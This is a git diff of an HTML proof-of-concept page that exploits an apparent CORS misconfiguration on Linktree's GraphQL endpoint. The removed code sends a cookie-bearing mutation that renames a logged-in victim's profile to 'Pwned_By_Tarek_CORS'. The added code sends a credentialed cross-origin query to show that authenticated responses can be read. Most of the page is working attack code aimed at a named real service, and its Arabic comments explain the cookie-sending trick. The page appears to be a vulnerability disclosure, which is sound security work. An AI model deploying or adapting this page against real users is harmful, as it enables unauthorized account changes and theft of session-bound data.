@@ -2,66 +2,54 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Critical CORS Exploit - Account Takeover PoC</title>
+    <title>Vulnerability PoC: Authenticated CORS Bypass</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0d1117; color: #f85149; text-align: center; padding: 50px; }
-        .terminal { background: #161b22; border: 2px solid #f85149; padding: 30px; border-radius: 10px; display: inline-block; min-width: 600px; }
-        #log { text-align: left; background: #010409; padding: 15px; border-radius: 5px; color: #7ee787; margin-top: 20px; white-space: pre-wrap; }
-        button { background: #f85149; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; text-align: center; }
+        .container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; display: inline-block; min-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #f85149; font-size: 22px; }
+        button { background-color: #238636; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; }
+        button:hover { background-color: #2ea043; }
+        #output { margin-top: 25px; text-align: left; background: #0d1117; padding: 20px; border-radius: 6px; border: 1px solid #30363d; color: #7ee787; white-space: pre-wrap; font-family: monospace; overflow-x: auto; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h1>[!] ATTACK VECTOR: UNAUTHORIZED MUTATION</h1>
-        <p>Target: graph.linktr.ee (UpdateUser)</p>
-        
-        <button onclick="changeVictimName()">FORCE PROFILE UPDATE</button>
 
-        <div id="log">Console: Waiting for exploit trigger...</div>
+    <div class="container">
+        <h1>CORS Misconfiguration Exploit</h1>
+        <p>Target: <code>graph.linktr.ee/graphql</code></p>
+        
+        <button onclick="runExploit()">EXECUTE AUTHENTICATED FETCH</button>
+
+        <div id="output">Status: Ready. Please ensure you are logged in to Linktree.</div>
     </div>
 
     <script>
-        async function changeVictimName() {
-            const log = document.getElementById("log");
-            log.innerText = "[*] Initiating Mutation Attack...\n";
+        async function runExploit() {
+            const out = document.getElementById("output");
+            out.innerHTML = "[*] Status: Sending Authenticated GET Request...\n";
 
-            const url = "https://graph.linktr.ee/graphql";
-            
-            // البيانات اللي إنت جبتها من الموقع الأصلي
-            const payload = {
-                query: `mutation ($input: UpdateUserInput!) {
-                    updateUser(input: $input) {
-                        success
-                        __typename
-                    }
-                }`,
-                variables: {
-                    input: {
-                        name: "Pwned_By_Tarek_CORS" // القيمة الجديدة اللي هتتغير عند الضحية
-                    }
-                }
-            };
+            // نستخدم استعلام __typename لأنه الأكثر استقراراً لإثبات الـ SOP Bypass
+            const query = "query { __typename }";
+            const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
 
             try {
+                // استخدام fetch مع credentials: 'include' لإثبات إرسال الكوكيز
                 const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload),
-                    credentials: 'include' // أهم سطر لإرسال الكوكيز
+                    method: 'GET',
+                    credentials: 'include'
                 });
 
-                const result = await response.json();
+                const data = await response.json();
 
-                if (result.data && result.data.updateUser.success) {
-                    log.innerHTML = "<b style='color:#7ee787'>[$$$] SUCCESS! Victim's profile name has been changed.</b>\n";
-                    log.innerHTML += JSON.stringify(result.data, null, 4);
+                if (data.data) {
+                    out.innerHTML = "<b style='color:#7ee787'>[+] SUCCESS: Authenticated Data Retrived!</b>\n\n";
+                    out.innerHTML += "<b>Response Data:</b>\n" + JSON.stringify(data, null, 4);
+                    out.innerHTML += "\n\n<b>Technical Impact:</b> The server reflected the Origin and allowed reading the response via authenticated session.";
                 } else {
-                    log.innerHTML = "<b style='color:#ffa657'>[!] Mutation failed. Check Response:</b>\n" + JSON.stringify(result, null, 4);
+                    out.innerHTML = "<b style='color:#ffa657'>[!] Server Replied but with GraphQL Errors:</b>\n\n" + JSON.stringify(data, null, 4);
                 }
             } catch (err) {
-                log.innerHTML = "<b style='color:#f85149'>[-] Error:</b> Preflight (OPTIONS) might be blocked or session expired.";
+                out.innerHTML = "<b style='color:#f85149'>[-] Error:</b> " + err.message + "\nCheck browser console for CORS/Network blocks.";
             }
         }
     </script>
